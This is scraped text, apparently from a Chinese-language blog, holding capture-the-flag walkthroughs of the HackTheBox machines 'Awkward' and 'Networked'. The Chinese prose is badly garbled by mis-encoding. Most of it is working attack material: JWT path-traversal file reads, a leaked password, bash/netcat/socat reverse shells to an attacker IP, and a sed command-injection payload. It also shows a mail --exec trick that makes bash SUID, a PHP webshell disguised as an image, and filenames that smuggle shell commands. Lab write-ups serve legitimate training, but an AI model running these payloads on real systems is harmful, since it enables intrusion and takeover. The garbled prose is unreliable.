~/.bash_aliases ]; then . ~/.bash_aliases fi # enable programmable completion features (you don&#39;t need to enable # this, if it&#39;s already enabled in /etc/bash.bashrc and /etc/profile # sources /etc/bash.bashrc). if ! shopt -oq posix; then if [ -f /usr/share/bash-completion/bash_completion ]; then . /usr/share/bash-completion/bash_completion elif [ -f /etc/bash_completion ]; then . /etc/bash_completion fi fi # custom alias backup_home=&#39;/bin/bash /home/bean/Documents/backup_home.sh&#39; æˆ‘ä»¬æ‰¾åˆ°äº†ä¸€ä¸ª aliasï¼Œè¿˜æœ‰ä¸€ä¸ª hash è„šæœ¬ /home/bean/Documents/backup_home.sh eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cF9ob21lLnNoICciLCJpYXQiOjE2Nzg1NTE0NTd9.nlTiW6mox1VXEHkf4fc_dX_pJqqtW8Srm58MNRTeSe0 curl http://hat-valley.htb/api/all-leave --header &quot;cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cF9ob21lLnNoICciLCJpYXQiOjE2Nzg1NTE0NTd9.nlTiW6mox1VXEHkf4fc_dX_pJqqtW8Srm58MNRTeSe0&quot; â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# curl http://hat-valley.htb/api/all-leave --header &quot;cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cF9ob21lLnNoICciLCJpYXQiOjE2Nzg1NTE0NTd9.nlTiW6mox1VXEHkf4fc_dX_pJqqtW8Srm58MNRTeSe0&quot; #!/bin/bash mkdir /home/bean/Documents/backup_tmp cd /home/bean tar --exclude=&#39;.npm&#39; --exclude=&#39;.cache&#39; --exclude=&#39;.vscode&#39; -czvf /home/bean/Documents/backup_tmp/bean_backup.tar.gz . date &gt; /home/bean/Documents/backup_tmp/time.txt cd /home/bean/Documents/backup_tmp tar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz . rm -r /home/bean/Documents/backup_tmp æˆ‘ä»¬å»ä¸‹è½½è¿™ä¸ªæ–‡ä»¶ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cC9iZWFuX2JhY2t1cF9maW5hbC50YXIuZ3ogJyIsImlhdCI6MTY2NzAxNzE1N30.0Rf75JtUz77mGO61T_NVG7_34fAJ_JckobQUBfbPeUw curl http://hat-valley.htb/api/all-leave --header &quot;Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cC9iZWFuX2JhY2t1cF9maW5hbC50YXIuZ3ogJyIsImlhdCI6MTY2NzAxNzE1N30.0Rf75JtUz77mGO61T_NVG7_34fAJ_JckobQUBfbPeUw&quot; --output bean_backup_final.zip â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/bean] â””â”€# curl http://hat-valley.htb/api/all-leave --header &quot;Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cC9iZWFuX2JhY2t1cF9maW5hbC50YXIuZ3ogJyIsImlhdCI6MTY2NzAxNzE1N30.0Rf75JtUz77mGO61T_NVG7_34fAJ_JckobQUBfbPeUw&quot; --output bean_backup_final.zip % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 31716 100 31716 0 0 61542 0 --:--:-- --:--:-- --:--:-- 61584 â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/bean] â””â”€# ls bean_backup_final.zip â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/bean] â””â”€# unzip bean_backup_final.zip Archive: bean_backup_final.zip End-of-central-directory signature not found. Either this file is not a zipfile, or it constitutes one disk of a multi-part archive. In the latter case the central directory and zipfile comment will be found on the last disk(s) of this archive. unzip: cannot find zipfile directory in one of bean_backup_final.zip or bean_backup_final.zip.zip, and cannot find bean_backup_final.zip.ZIP, period. å°†æ–‡ä»¶è§£å‹å‡ºæ¥ â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/bean] â””â”€# ls -la æ€»è®¡ 68 drwxr-xr-x 6 root root 4096 3æœˆ12æ—¥ 01:26 . drwxr-xr-x 3 root root 4096 3æœˆ12æ—¥ 01:17 .. lrwxrwxrwx 1 lucifiel lucifiel 9 9æœˆ15æ—¥ 19:40 .bash_history -&gt; /dev/null -rw-r--r-- 1 lucifiel lucifiel 220 9æœˆ15æ—¥ 19:34 .bash_logout -rw-r--r-- 1 lucifiel lucifiel 3847 9æœˆ15æ—¥ 19:45 .bashrc -rw-r--r-- 1 root root 31716 3æœˆ12æ—¥ 01:26 bean_backup_final.zip drwxr-xr-x 12 root root 4096 3æœˆ12æ—¥ 01:24 .config drwxr-xr-x 2 root root 4096 3æœˆ12æ—¥ 01:24 .gnupg drwxr-xr-x 3 root root 4096 3æœˆ12æ—¥ 01:24 .local -rw-r--r-- 1 lucifiel lucifiel 807 9æœˆ15æ—¥ 19:34 .profile drwx------ 2 lucifiel lucifiel 4096 9æœˆ15æ—¥ 19:36 .ssh è¿™æ˜¯è§£å‹å‡ºæ¥çš„æ–‡ä»¶ â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/bean/.config/xpad] â””â”€# cat content-DS1ZS1 TO DO: - Get real hat prices / stock from Christine - Implement more secure hashing mechanism for HR system - Setup better confirmation message when adding item to cart - Add support for item quantity &gt; 1 - Implement checkout system î€€boldî€€HR SYSTEMî€€/boldî€€ bean.hill 014mrbeanrules!#P https://www.slac.stanford.edu/slac/www/resource/how-to-use/cgi-rexx/cgi-esc.html î€€boldî€€MAKE SURE TO USE THIS EVERYWHERE ^^^î€€/boldî€€ åœ¨ bean&#x2F;.config&#x2F;xpad&#x2F;content-DS1ZS1 ä¸­æ‰¾åˆ°äº† bean çš„å¯†ç  username = bean.hill password = 014mrbeanrules!#P å°è¯•ä½¿ç”¨ bean å»ç™»å½• ssh â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# ssh bean@10.10.11.185 The authenticity of host &#39;10.10.11.185 (10.10.11.185)&#39; can&#39;t be established. ED25519 key fingerprint is SHA256:iXn1BLzsoL4oHP9bO/v5F/CKp7pdoku6nopTeJlvR3U. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;10.10.11.185&#39; (ED25519) to the list of known hosts. bean@10.10.11.185&#39;s password: Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-52-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Sun Mar 12 01:59:31 2023 from 10.10.14.68 bean@awkward:~$ whoami&amp;&amp;id bean uid=1001(bean) gid=1001(bean) groups=1001(bean) æˆåŠŸç™»å½•åˆ° user ç”¨æˆ· bean@awkward:~$ cat user.txt 5005243124dea7c1f14fc7d933ef2946 æˆåŠŸæ‹¿åˆ° user ç”¨æˆ·çš„ flag æ–‡ä»¶ æƒé™æå‡è¿˜è®°å¾—æˆ‘ä»¬çš„å­åŸŸå store å—ï¼Ÿ åœ¨ burp ä¸­çš„æ—¶å€™æ˜¾ç¤ºè¯¥é¡µé¢æ¥è‡ª nginx æœåŠ¡å™¨ï¼Œè®©æˆ‘ä»¬çœ‹ä¸€ä¸‹ shell ä¸­çš„ nginx é…ç½®æ–‡ä»¶ bean@awkward:~$ cd /etc/nginx/conf.d/ bean@awkward:/etc/nginx/conf.d$ ls -la total 12 drwxr-xr-x 2 root root 4096 Sep 15 22:34 . drwxr-xr-x 8 root root 4096 Oct 6 00:49 .. -rw-r--r-- 1 root root 44 Sep 15 22:34 .htpasswd bean@awkward:/etc/nginx/conf.d$ cat .htpasswd admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1 æˆ‘ä»¬ä½¿ç”¨ john å»è·‘ä¸€ä¸‹ â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# john --wordlist=/usr/share/wordlists/rockyou.txt hash Warning: detected hash type &quot;md5crypt&quot;, but the string is also recognized as &quot;md5crypt-long&quot; Use the &quot;--format=md5crypt-long&quot; option to force loading these as that type instead Using default input encoding: UTF-8 Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3]) Will run 4 OpenMP threads Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status 0g 0:00:01:30 DONE (2023-03-12 01:34) 0g/s 156319p/s 156319c/s 156319C/s ejngyhga007..*7Â¡Vamos! Session completed. ç„¶è€Œå¹¶æ²¡æœ‰ç»“æœ ç„¶è€Œæˆ‘çªç„¶æƒ³èµ·æ¥ content-DS1ZS1 æ–‡ä»¶åº•éƒ¨æœ‰ä¸€å¥æ³¨é‡Š î€€boldî€€MAKE SURE TO USE THIS EVERYWHERE ^^^î€€/boldî€€ å¤§æ¦‚æ„æ€å°±æ˜¯è®©æˆ‘ä»¬å¯¼å‡ºå°è¯•ä¸€ä¸‹ username = admin password = 014mrbeanrules!#P ä½¿ç”¨ bean çš„ä»£ç å‰å¾€ http://store.hat-valley.htb/ ç™»å½• admin è´¦æˆ·æˆåŠŸ è¿™å¾ˆæ˜æ˜¾æ˜¯ Hat Valley çš„åœ¨çº¿å•†åº—ã€‚æˆ‘ä»¬å»æŸ¥çœ‹ä¸€ä¸‹ä»£ç  bean@awkward:/var/www/store$ ls -la total 104 drwxr-xr-x 9 root root 4096 Oct 6 01:35 . drwxr-xr-x 7 root root 4096 Oct 6 01:35 .. drwxrwxrwx 2 root root 4096 Mar 12 01:30 cart -rwxr-xr-x 1 root root 3664 Sep 15 20:09 cart_actions.php -rwxr-xr-x 1 root root 12140 Sep 15 20:09 cart.php -rwxr-xr-x 1 root root 9143 Sep 15 20:09 checkout.php drwxr-xr-x 2 root root 4096 Oct 6 01:35 css drwxr-xr-x 2 root root 4096 Oct 6 01:35 fonts drwxr-xr-x 6 root root 4096 Oct 6 01:35 img -rwxr-xr-x 1 root root 14770 Sep 15 20:09 index.php drwxr-xr-x 3 root root 4096 Oct 6 01:35 js drwxrwxrwx 2 root root 4096 Mar 12 04:30 product-details -rwxr-xr-x 1 root root 918 Sep 15 20:09 README.md -rwxr-xr-x 1 root root 13731 Sep 15 20:09 shop.php drwxr-xr-x 6 root root 4096 Oct 6 01:35 static -rwxr-xr-x 1 root root 695 Sep 15 20:09 style.css bean@awkward:/var/www/store$ cat README.md # Hat Valley - Shop Online! ### To Do 1. Waiting for SQL database to be setup, using offline files for now, will merge with database once it is setup 2. Implement checkout system, link with credit card system (Stripe??) 3. Implement shop filter 4. Get full catalogue of items ### How to Add New Catalogue Item 1. Copy an existing item from /product-details and paste it in the same folder, changing the name to reflect a new product ID 2. Change the fields to the appropriate values and save the file. -- NOTE: Please leave the header on first line! This is used to verify it as a valid Hat Valley product. -- ### Hat Valley Cart Right now, the user&#39;s cart is stored within /cart, and is named according to the user&#39;s session ID. All products are appended to the same file for each user. To test cart functionality, create a new cart file and add items to it, and see how they are reflected on the store website! README.md å‘Šè¯‰æˆ‘ä»¬æ–‡ä»¶æ­£ç¦»çº¿å­˜å‚¨åœ¨ &#x2F;product-details å’Œ &#x2F;cart ä¸­ åœ¨æ–‡ä»¶ cart_actions.php ä¸­çš„ä¸€æ®µä»£ç  if(checkValidItem(&quot;{$STORE_HOME}cart/{$user_id}&quot;)) { system(&quot;sed -i &#39;/item_id={$item_id}/d&#39; {$STORE_HOME}cart/{$user_id}&quot;); echo &quot;Item removed from cart&quot;; } else { echo &quot;Invalid item&quot;; } exit; è¿™ä¸å°±æœ‰äº† è¿™æ®µä¸­çš„ sed å‘½ä»¤æ˜¯ç”¨äºä»è´­ç‰©è½¦æ–‡ä»¶ä¸­åˆ é™¤æ•°æ® æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªä»£ç æ¥è¿›è¡Œè¿œç¨‹ä»£ç æ‰§è¡Œ é¦–å…ˆæˆ‘ä»¬éœ€è¦ä¸€ä¸ª Reverse Shell echo &quot;bash -i &gt;&amp; /dev/tcp/10.10.16.26/4444 0&gt;&amp;1&quot; &gt;&gt; /tmp/shell.sh chmod 777 /tmp/shell.sh bean@awkward:/var/www/store/cart$ cat /tmp/shell.sh #!/bin/bash bash -i &gt;&amp; /dev/tcp/10.10.16.26/4444 0&gt;&amp;1 nc -nvlp 4444 ç„¶åæ¥ç€æˆ‘ä»¬å°†äº§å“æ·»åŠ åˆ°è´­ç‰©è½¦ ç„¶åä¿®æ”¹ä¸€ä¸‹å‚æ•°ï¼ŒåŠ å…¥ä¸‹é¢çš„å‚æ•° 1/&#39;+-e+&quot;1e+/tmp/shell.sh&quot;+/tmp/shell.sh+&#39; ç„¶åæˆ‘ä»¬éœ€è¦ä¿®æ”¹åœ¨ &#x2F;cart ä¸­åˆ›å»ºçš„æ–‡ä»¶ï¼Œä¸å¹¸çš„æ˜¯æˆ‘ä»¬æ²¡æœ‰æ“ä½œæƒé™ï¼Œæ‰€ä»¥æˆ‘ä»¬é€‰æ‹©åˆ é™¤è¿™ä¸ªæ–‡ä»¶ï¼Œç„¶åè‡ªå·±åˆ›å»ºä¸€ä¸ª bean@awkward:/var/www/store/cart$ ls b1b9-7006-2d9-74bc bean@awkward:/var/www/store/cart$ cp b1b9-7006-2d9-74bc bak bean@awkward:/var/www/store/cart$ rm -rf b1b9-7006-2d9-74bc bean@awkward:/var/www/store/cart$ cp bak b1b9-7006-2d9-74bc bean@awkward:/var/www/store/cart$ vi b1b9-7006-2d9-74bc bean@awkward:/var/www/store/cart$ cat b1b9-7006-2d9-74bc ***Hat Valley Cart*** item_id=1&#39; -e &quot;1e /tmp/shell.sh&quot; /tmp/shell.sh &#39;&amp;item_name=Yellow Beanie&amp;item_brand=Good Doggo&amp;item_price=$39.90 ç„¶åæˆ‘ä»¬æŠ“ä¸€ä¸ªåˆ é™¤å•†å“çš„åŒ… ä¿®æ”¹å¥½ä»¥åæ‰§è¡Œ è¿™è¾¹æ‹¿åˆ°çš„æ˜¯ www-data çš„æƒé™ å»æ‰§è¡Œä¸€ä¸‹ pspy å½“æœ‰æ–°çš„è¯·å‡è¯·æ±‚çš„æ—¶å€™ï¼Œä¼šè°ƒç”¨ mail å‘½ä»¤æ‹¼æ¥å¯¹åº” csv æ–‡ä»¶ä¸­çš„ name 2023/03/12 05:12:09 CMD: UID=0 PID=74503 | mail -s Leave Request: christopher.jones christine www-data@awkward:/tmp$ cat exploit.sh #!/bin/bash chmod +s /bin/bash www-data@awkward:/tmp$ chmod 777 exploit www-data@awkward:/tmp$ cd /var/www/private www-data@awkward:~/private$ echo &#39;&quot; --exec=&quot;\\!/tmp/exploit.sh&quot;&#39; &gt;&gt; leave_requests.csv &lt;&quot; --exec=&quot;\\!/tmp/exploit.sh&quot;&#39; &gt;&gt; leave_requests.csv www-data@awkward:~/private$ ls -la /bin/bash ls -la /bin/bash -rwsr-sr-x 1 root root 1396520 Jan 7 2022 /bin/bash www-data@awkward:~/private$ /bin/bash -p /bin/bash -p whoami&amp;&amp;id root uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data) æˆåŠŸææƒåˆ° root æƒé™ cat /root/root.txt 5d3d649dfbaf5f418cdca5f79012eafa æˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Networked - Hackthebox","slug":"Hackthebox - Networked","date":"2023-03-06T11:38:36.000Z","updated":"2023-05-20T02:08:08.000Z","comments":true,"path":"2023/03/06/Hackthebox - Networked/","link":"","permalink":"http://www.lucifiel.com/2023/03/06/Hackthebox%20-%20Networked/","excerpt":"","text":"Hackthebox - Networkedé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æ”¶é›†Nmapâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 10000 10.10.10.146 Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 19:52 CST Nmap scan report for 10.10.10.146 Host is up (0.11s latency). Not shown: 65513 filtered tcp ports (no-response), 19 filtered tcp ports (host-prohibited) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 2275d7a74f81a7af5266e52744b1015b (RSA) | 256 2d6328fca299c7d435b9459a4b38f9c8 (ECDSA) |_ 256 73cda05b84107da71c7c611df554cfc4 (ED25519) 80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/5.4.16) |_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16 |_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8). 443/tcp closed https Aggressive OS guesses: Linux 3.10 - 4.11 (94%), Linux 5.1 (92%), Linux 3.2 - 4.9 (91%), Linux 3.13 (90%), Linux 4.10 (90%), Linux 4.4 (90%), Linux 3.10 (90%), Linux 3.11 - 3.12 (90%), Linux 3.18 (90%), Linux 3.2 (90%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops TRACEROUTE (using port 443/tcp) HOP RTT ADDRESS 1 87.93 ms 10.10.16.1 2 132.57 ms 10.10.10.146 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 27.97 seconds Http ä¼¼ä¹æ˜¯è¯´è¿™ä¸ªç½‘ç«™è¿˜åœ¨åšï¼Œæˆ‘ä»¬å»åšä¸ª fuzz çœ‹çœ‹ Fuzzâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# ffuf -u &quot;http://10.10.10.146/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 200 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.5.0 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://10.10.10.146/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 200 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 ________________________________________________ [Status: 200, Size: 229, Words: 33, Lines: 9, Duration: 89ms] uploads [Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 9426ms] backup [Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 88ms] :: Progress: [30000/30000] :: Job [1/1] :: 2217 req/sec :: Duration: [0:00:22] :: Errors: 2 :: æœ‰ä¸¤ä¸ªæ–‡ä»¶å¤¹ï¼Œä¸€ä¸ª uploadsï¼Œä¸€ä¸ª backup æœ‰ä¸€ä¸ªå¤‡ä»½æ–‡ä»¶ï¼Œä¸‹è½½åè§£å‹çœ‹çœ‹ â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/backup] â””â”€# ls -la æ€»è®¡ 36 drwxr-xr-x 2 root root 4096 2æœˆ26æ—¥ 00:52 . drwxr-xr-x 3 root root 4096 2æœˆ26æ—¥ 00:51 .. -rw-r--r-- 1 root root 10240 2019å¹´ 7æœˆ 9æ—¥ backup.tar -rw-r--r-- 1 root root 229 2æœˆ26æ—¥ 00:52 index.php -rw-r--r-- 1 root root 2001 2æœˆ26æ—¥ 00:52 lib.php -rw-r--r-- 1 root root 1871 2æœˆ26æ—¥ 00:52 photos.php -rw-r--r-- 1 root root 1331 2æœˆ26æ—¥ 00:52 upload.php è¿™è¾¹å¯ä»¥çœ‹åˆ°æœ‰å‡ ä¸ªæ–‡ä»¶ï¼Œå¤§æ¦‚çš„é€»è¾‘å¯ä»¥ç†æ¸…äº† é€šè¿‡ upload ä¸Šä¼ æ–‡ä»¶ï¼Œé€šè¿‡ photos æŸ¥çœ‹å›¾ç‰‡ //$name = $_SERVER[&#39;REMOTE_ADDR&#39;].&#39;-&#39;. $myFile[&quot;name&quot;]; list ($foo,$ext) = getnameUpload($myFile[&quot;name&quot;]); $validext = array(&#39;.jpg&#39;, &#39;.png&#39;, &#39;.gif&#39;, &#39;.jpeg&#39;); $valid = false; foreach ($validext as $vext) { if (substr_compare($myFile[&quot;name&quot;], $vext, -strlen($vext)) === 0) { $valid = true; é€šè¿‡å®¡è®¡ upload.php æ–‡ä»¶çš„ä»£ç ï¼Œå‘ç°æœ‰ç™½åå•é™åˆ¶ï¼Œåªèƒ½ä¸Šä¼  .jpg ã€png ã€.gif ã€.jpeg å››ä¸ªæ ¼å¼çš„æ–‡ä»¶ æ¼æ´åˆ©ç”¨â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/backup] â””â”€# ls 1.jpg backup.tar index.php lib.php photos.php upload.php â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/backup] â””â”€# cat 2.php php -r &#39;$sock=fsockopen(getenv(&quot;10.10.16.3&quot;),getenv(&quot;4444&quot;));exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39; å‡†å¤‡ä¸€å¼ å›¾ç‰‡å’Œä¸€ä¸ª php æ¥åˆ¶ä½œ shell echo &#39;&lt;?php&#39; &gt;&gt; 1.jpg echo &#39;passthru(&quot;whoami&quot;);&#39; &gt;&gt; 1.jpg echo &#39;?&gt;&#39; &gt;&gt; 1.jpg mv 1.jpg 1.php.jpg æˆåŠŸä¸Šä¼  å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ ç¡®å®è¢«æ‰§è¡Œäº†ï¼Œæƒé™æ˜¯ apacheï¼Œæˆ‘ä»¬å»åˆ¶ä½œä¸€ä¸‹åå¼¹çš„ shell mv 1.jpg shell.php.jpg echo &#39;&lt;?php&#39; &gt;&gt; shell.php.jpg echo &#39;passthru(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.3 4444 &gt;/tmp/f&quot;);&#39; &gt;&gt; shell.php.jpg echo &#39;?&gt;&#39; &gt;&gt; shell.php.jpg nc -nvlp 4444 ç„¶åå»ä¸Šä¼  â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/backup] â””â”€# rlwrap nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.16.3] from (UNKNOWN) [10.10.10.146] 59222 sh: no job control in this shell sh-4.2$ whoami&amp;&amp;id whoami&amp;&amp;id apache uid=48(apache) gid=48(apache) groups=48(apache) æˆåŠŸæ‹¿åˆ° shell æƒé™æå‡Usersh-4.2$ ls -la ls -la total 28 drwxr-xr-x. 2 guly guly 4096 Sep 6 15:57 . drwxr-xr-x. 3 root root 18 Jul 2 2019 .. lrwxrwxrwx. 1 root root 9 Sep 7 13:05 .bash_history -&gt; /dev/null -rw-r--r--. 1 guly guly 18 Oct 30 2018 .bash_logout -rw-r--r--. 1 guly guly 193 Oct 30 2018 .bash_profile -rw-r--r--. 1 guly guly 231 Oct 30 2018 .bashrc -r--r--r--. 1 root root 782 Oct 30 2018 check_attack.php -rw-r--r-- 1 root root 44 Oct 30 2018 crontab.guly -r--------. 1 guly guly 33 Mar 6 12:51 user.txt åœ¨ /home ä¸‹æœ‰ä¸€ä¸ªç”¨æˆ· guly ç„¶ååœ¨ç”¨æˆ· guly ä¸­æœ‰å‡ ä¸ªå¯è¯»æ–‡ä»¶ï¼ŒæŒ¨ä¸ªæŸ¥çœ‹ä¸€ä¸‹ sh-4.2$ cat check_attack.php cat check_attack.php &lt;?php require &#39;/var/www/html/lib.php&#39;; $path = &#39;/var/www/html/uploads/&#39;; $logpath = &#39;/tmp/attack.log&#39;; $to = &#39;guly&#39;; $msg= &#39;&#39;; $headers = &quot;X-Mailer: check_attack.php\\r\\n&quot;; $files = array(); $files = preg_grep(&#39;/^([^.])/&#39;, scandir($path)); foreach ($files as $key =&gt; $value) { $msg=&#39;&#39;; if ($value == &#39;index.html&#39;) { continue; } #echo &quot;-------------\\n&quot;; #print &quot;check: $value\\n&quot;; list ($name,$ext) = getnameCheck($value); $check = check_ip($name,$value); if (!($check[0])) { echo &quot;attack!\\n&quot;; # todo: attach file file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX); exec(&quot;rm -f $logpath&quot;); exec(&quot;nohup /bin/rm -f $path$value &gt; /dev/null 2&gt;&amp;1 &amp;&quot;); echo &quot;rm -f $path$value\\n&quot;; mail($to, $msg, $msg, $headers, &quot;-F$value&quot;); } } ?&gt; sh-4.2$ cat crontab.guly cat crontab.guly */3 * * * * php /home/guly/check_attack.php ä» crontab.guly é‡Œå¯ä»¥çœ‹åˆ°ï¼Œæ¯ä¸‰åˆ†é’Ÿä¼šæ‰§è¡Œä¸€æ¬¡ check_attack.php è¿™é‡Œä¼šå¼•å…¥ä¸€ä¸ªåº“æ–‡ä»¶ /var/www/html/lib.php ä½†æ˜¯å¯æƒœçš„æ˜¯ï¼Œæˆ‘ä»¬æ²¡æœ‰æƒé™ä¿®æ”¹å®ƒ ä½†æ˜¯æœ‰ä¸€ä¸ªç‚¹æˆ‘å‘ç°æ˜¯å¯æ§çš„ï¼Œä¸Šä¼ æ–‡ä»¶å¤¹ä¸­çš„æ–‡ä»¶å($value)æ˜¯å¯æ§çš„ é‚£ä¹ˆé¦–å…ˆï¼Œæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªç©ºçš„æµ‹è¯•æ–‡ä»¶ï¼Œå¹¶å°†å®ƒæ”¾å…¥ä¸Šä¼ æ–‡ä»¶å¤¹ä¸­ cd /var/www/html/uploads touch &quot;test.txt&quot; ç°åœ¨æˆ‘ä»¬å°†â€œtest.txtâ€åˆ†é…ç»™ $valueï¼Œæ‰§è¡Œ php è„šæœ¬å¹¶æŸ¥çœ‹è¾“å‡º php /home/guly/check_attack.php sh-4.2$ php /home/guly/check_attack.php php /home/guly/check_attack.php attack! rm -f /var/www/html/uploads/test.txt è¿™è¡¨æ˜æ–‡ä»¶åï¼ˆ$valueï¼‰é™„åŠ åˆ° â€œ&#x2F;var&#x2F;www&#x2F;html&#x2F;uploadsâ€ çš„æœ«å°¾ã€‚ æ‰€ä»¥åœ¨ä»£ç ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å®Œå…¨æ§åˆ¶çš„éƒ¨åˆ†æ˜¯ â€œrm -f &#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;test.txtâ€ åœ¨è„šæœ¬ä¸­ï¼Œæˆ‘æ­£åœ¨æ“æ§çš„ä»£ç æ˜¯ exec(&quot;nohup /bin/rm -f $path$value &gt; /dev/null 2&gt;&amp;1 &amp;&quot;); æ‰€ä»¥æˆ‘å‡†å¤‡åˆ›å»ºä¸€ä¸ªä»¥åˆ†å·å¼€å¤´å¹¶ä»¥å‘½ä»¤ç»“å°¾çš„æ–‡ä»¶åï¼Œæ¥è‡ªå®šä¹‰æ‰§è¡Œæˆ‘ä»¬çš„ php exec() å‡½æ•° exec(&quot;nohup /bin/rm -f $path ; command-to-inject &gt; /dev/null 2&gt;&amp;1 &amp;&quot;); okï¼Œæˆ‘ä»¬æ­£å¼å¼€å§‹ touch &quot;; nc 10.10.16.3 5555 -e &#39;/bin/bash&#39;&quot; sh-4.2$ touch &quot;; nc 10.10.16.3 5555 -e &#39;/bin/bash&#39;&quot; touch &quot;; nc 10.10.16.3 5555 -e &#39;/bin/bash&#39;&quot; touch: cannot touch &#39;; nc 10.10.16.3 5555 -e \\&#39;/bin/bash\\&#39;&#39;: No such file or directory è¿™è¾¹ä¼¼ä¹ç”¨ netcat æ‰§è¡Œæ¯”è¾ƒéº»çƒ¦ï¼Œåæ–œæ çš„åŸå› å§ï¼Œæ‡’å¾—å¼„ç¼–ç äº†ï¼Œç”¨ socat è¯•è¯•å§ socat file:`tty`,raw,echo=0 tcp-listen:5555 ç„¶åå»åˆ›å»ºæˆ‘ä»¬çš„æ–‡ä»¶å touch &quot;; socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:10.10.16.3:5555&quot; ç„¶åå†å»æ‰§è¡Œä¸€ä¸‹ php è„šæœ¬ php /home/guly/check_attack.php sh-4.2$ php /home/guly/check_attack.php php /home/guly/check_attack.php attack! /bin/rm: cannot remove &#39;/var/www/html/uploads/&#39;: Is a directory rm -f /var/www/html/uploads/; socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:10.10.16.3:5555 â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# socat file:`tty`,raw,echo=0 tcp-listen:5555 bash-4.2$ whoami&amp;&amp;id apache uid=48(apache) gid=48(apache) groups=48(apache) 